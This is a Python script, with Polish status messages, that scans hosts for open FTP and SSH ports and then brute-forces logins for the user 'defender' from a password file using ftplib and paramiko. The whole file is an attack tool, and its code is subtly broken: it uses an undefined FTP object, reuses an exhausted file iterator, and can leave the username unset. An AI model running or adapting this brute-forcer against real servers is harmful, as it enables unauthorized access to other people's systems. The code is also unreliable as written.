import research
import ftplib
from itertools import product
import requests
import urllib3
import paramiko

ftp = ftplib.FTP()


def bruteforcing():
    psswd_list = open("passwd.txt", "r", encoding="utf-8")

    found_ports = research.port_scanner()
    for item in found_ports:
        ftp_port = 21
        if ftp_port in found_ports[item]:
            user = "defender"
            print(f"Na maszynie o adresie IP: {item} znaleziono otwrty port FTP: {ftp_port}.")
            # port_ftp = found_ports[item]
            # print(port_ftp)
            for psswd in psswd_list:
                print(f"Sprawdzam hasło dla FTP {item}: {psswd}")
                try:
                    ftpserver.connect(item, ftp_port, 2)
                    ftpserver.login(user, psswd)
                    print(f"SUKCES!!! Prawidłowe hasło: {psswd}")
                except:
                    continue

        ssh_port = 22
        if ssh_port in found_ports[item]:
            print(f"Na maszynie o adresie IP: {item} znaleziono otwrty port SSH: {ssh_port}.")
            target = paramiko.SSHClient()
            target.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            targethost = item
            for psswd in psswd_list:
                print(f"Sprawdzam hasło dla SSH: {psswd}")
                try:
                    target.connect(hostname=targethost, username=user, password=psswd, timeout=2, port=ssh_port)
                    print(f"Hasło złamane!!! -----------------> {psswd}")
                except:
                    continue
